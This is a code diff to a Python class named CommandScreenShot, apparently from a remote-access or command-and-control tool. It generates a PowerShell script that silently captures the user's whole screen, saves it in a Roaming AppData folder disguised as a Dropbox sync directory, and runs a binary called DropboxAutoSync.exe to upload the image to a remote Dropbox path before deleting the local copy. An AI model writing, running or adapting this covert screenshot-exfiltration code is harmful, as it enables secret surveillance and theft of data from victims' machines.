@@ -35,14 +35,15 @@ class CommandScreenShot(CommandBase):
         name = self._ScreenshotRemoteFileName
         script = "[Reflection.Assembly]::LoadWithPartialName('System.Drawing');"\
                  "$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080);"\
-                 "$path = 'scr.png';"\
+                 "$scr_path = \"C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\MyDropbox\\DropboxAutoSync\\scr.png\";"\
                  "$bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;"\
                  "$graphics = [Drawing.Graphics]::FromImage($bmp);"\
                  "$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);"\
-                 "$bmp.Save($path);"\
+                 "$bmp.Save($scr_path);"\
                  "$graphics.Dispose();"\
-                 "$bmp.Dispose();"\
-                 f".\DropboxAutoSync.exe put {name} {prefix}/{name};"\
+                 "$bmp.Dispose();" \
+                 "$path=\"C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\MyDropbox\\DropboxAutoSync\\DropboxAutoSync.exe\";"\
+                 f"& $path put \"$scr_path\" \"{prefix}/{name}\";" \
                  f"Remove-Item {name};"
         engine.run_script(script)
         return True
